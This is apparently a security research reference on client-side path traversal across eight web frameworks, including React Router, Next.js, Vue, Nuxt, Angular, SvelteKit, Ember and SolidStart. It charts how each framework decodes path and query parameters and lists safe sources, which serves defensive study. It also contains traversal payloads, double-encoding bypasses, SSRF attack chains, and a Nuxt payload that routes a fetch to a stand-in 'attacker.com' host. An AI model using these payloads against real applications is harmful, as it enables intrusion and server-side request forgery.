# Framework Decoding Matrix

Full decoding behavior reference. Source: xssdoctor's CSPT research across 8 frameworks.

---

## Path Parameters: Does %2F decode to /?

| Framework | Source | %2F → /? | %2E%2E → ..? | Double-encode %252F? | Notes |
|---|---|---|---|---|---|
| React Router | `useParams()` | **YES** | YES | **YES** (decode + replace) | `decodePath()` then `.replace(/%2F/g, "/")` |
| Next.js page | `useParams()` / `await params` | **NO** | YES | NO | `getParamValue()` re-encodes %2F |
| Next.js route handler | `await params` | **YES** | YES | NO | `getRouteMatcher()` → decode, different pipeline |
| Vue Router | `route.params.*` | **YES** | YES | NO | `decodeParams()` → `decodeURIComponent` |
| Nuxt (client) | `useRoute().params.*` | **YES** | YES | NO | Inherits Vue Router |
| Nuxt (server, default) | `getRouterParam(event, 'id')` | **NO** | NO | NO | Raw from radix3 |
| Nuxt (server, opt-in) | `getRouterParam(event, 'id', { decode: true })` | **YES** | YES | NO | Explicit decode |
| Angular | `paramMap.get()` | **YES** | YES | NO | `decode()` → `decodeURIComponent` after matching |
| SvelteKit | `params.*` in load functions | **YES** | YES | **NO** | `%25`-split blocks double-encode |
| Ember (:param) | `params.*` in model hook | **YES** | YES | **NO** | `normalizePath()` re-encodes %, prevents double-encode |
| Ember (*wildcard) | `params.*` in model hook | **NO** | Partial | NO | Star segments skip final `decodeURIComponent` |
| SolidStart | `useParams()` | **NO** | NO | NO | Router never calls `decodeURIComponent` |

---

## Query Parameters: Decoded Everywhere

**All frameworks decode query parameters. There are no exceptions.**

| Framework | Source | Decoded? | Notes |
|---|---|---|---|
| React Router | `useSearchParams()` | YES | Standard `URLSearchParams` |
| Next.js | `useSearchParams()` / `searchParams` | YES | Standard `URLSearchParams` |
| Vue Router | `route.query.*` | YES | Vue's `parseQuery()`, `+` stays literal (not space) |
| Nuxt (client) | `useRoute().query.*` | YES | Inherits Vue Router `parseQuery()` |
| Nuxt (server) | `getQuery(event)` | YES | ufo library decodes |
| Angular | `queryParamMap.get()` | YES | `decodeQuery()` → `decodeURIComponent` |
| SvelteKit | `url.searchParams` / `$page.url.searchParams` | YES | Standard `URLSearchParams` |
| Ember | Query params in `model` hook | YES | Browser-decoded |
| SolidStart | `useSearchParams()` | YES | Standard `URLSearchParams` — **primary CSPT vector** |

---

## Framework-Specific Gotchas

### React Router
- `decodePath()` re-encodes `/` back to `%2F` to prevent route-matching bypass
- But `matchPath()` line 811 does `.replace(/%2F/g, "/")` — the re-encoding is undone before params reach you
- **Double-encode:** `%252F` → `decodePath()` produces `%2F` → `.replace(/%2F/g, "/")` produces `/`. Double-encode works.
- **Splat routes** (`path="files/*"`): the `params["*"]` uses `(.*)` regex, captures across `/` boundaries. Literal `../../` works with no encoding.

### Next.js — The Split Personality Bug
Critical: same `await params` API, opposite behavior in two contexts:
- **Page components / layouts / `useParams()`**: goes through `getParamValue()` which re-encodes `%2F` → safe
- **Route handlers (`app/api/.../route.ts`)**: goes through `getRouteMatcher()` which decodes `%2F` to `/` → exploitable
- Attack chain: page component reads safe re-encoded param, passes it via fetch to a route handler, route handler auto-decodes it and uses it in an internal `fetch()`. Secondary SSRF.

### Angular
- `SEGMENT_RE = /^[^\/()?;#]+/` — `%2F` is treated as 3 chars during matching (%, 2, F), so route matches
- After matching, `decode()` → `decodeURIComponent` runs — slashes become real
- `router.navigate(['/path', '..%2Fadmin'])` re-encodes `%` to `%25`, producing `..%252Fadmin` — traversal does NOT happen via navigate, but does happen at `HttpClient` sink
- `**` wildcard: does NOT capture sub-paths in a named param — architecturally safer than React splat

### Vue Router
- `route.params.*` — decoded (slashes real)
- `route.path` / `route.fullPath` — preserved encoded (safe)
- `router.push('/users/../../admin')` — browser resolves the `../`, traversal lands on navigate
- `router.push({ name: 'user', params: { userId: '../../admin' } })` — encodes to `..%2F..%2Fadmin` (safe at navigation, decodes back in params)
- Catch-all `/:pathMatch(.*)*`: `%2F` decodes to `/` inside one element, not as array separator

### SvelteKit
- Two-stage decode: `decode_pathname()` (uses `decodeURI`, leaves `%2F`) → route match → `decode_params()` (uses `decodeURIComponent`, converts `%2F` to `/`)
- **Double-encode blocked:** `%25`-split in `decode_pathname()` means `%252F` becomes `%2F` (literal string), not `/`
- **Param matchers** (`[id=id]`) — strongest defense in any framework; rejects non-matching values before load function runs
- Server-side sink (`+page.server.ts`) bypasses `hooks.server.ts` auth middleware

### Ember
- `normalizePath()` decodes each segment then re-encodes `/` and `%` — this is what makes double-encode fail
- Dynamic `:param`: fully decoded in `findHandler()` — `..%2Fadmin` → `../admin`
- Wildcard `*param`: skips final `decodeURIComponent` — `..%2Fadmin` stays encoded; use literal `../../` instead
- `%2e%2e%2f` works for dynamic params (normalizePath decodes dots, re-encodes slash → intermediate `..%2F` → final decode → `../`)

### SolidStart
- Only 2 `decodeURIComponent` calls in the entire router: one for `<A>` active CSS, one for scroll-to-hash
- Path params are raw — `..%2F` stays `..%2F`
- **Primary CSPT vector is query params** — `useSearchParams()` uses browser `URLSearchParams` which auto-decodes
- Server functions (`"use server"` / `query()`) pass strings through unchanged — if input is already decoded (from query param), traversal crosses the RPC boundary to server-side fetch → SSRF

### Nuxt — Unique: Island Component CSPT
- `revive-payload.client.js` uses keys from `window.__NUXT__` payload in `$fetch("/__nuxt_island/${key}.json")`
- If payload is poisoned (cache poisoning / stored injection), key can traverse the fetch URL
- `.json` suffix appended, but query param absorbs it: `key = "../../api/proxy/attacker.com?x="` → `$fetch("/__nuxt_island/../../api/proxy/attacker.com?x=.json")` → resolves to `/api/proxy/attacker.com?x=.json`
- Assigned **CVE-2025-59414**

---

## Safe Sources Per Framework

| Framework | Safe Source | Why |
|---|---|---|
| React Router | `useLocation().pathname` | Preserves `%2F` encoding |
| Next.js | `useParams()` in page components | `getParamValue()` re-encodes |
| Vue Router | `route.path`, `route.fullPath` | Preserves encoding |
| Nuxt (client) | `route.path`, `route.fullPath` | Inherits Vue Router |
| Nuxt (server) | `getRouterParam()` without `{ decode: true }` | Raw from radix3 |
| Angular | `router.url` | Preserves encoding |
| SvelteKit | Param matchers (`[id=id]`) | Rejects at route level |
| Ember | `window.location.pathname` | Bypasses route-recognizer |
| SolidStart | `useParams()` (single segment) | Never decoded |
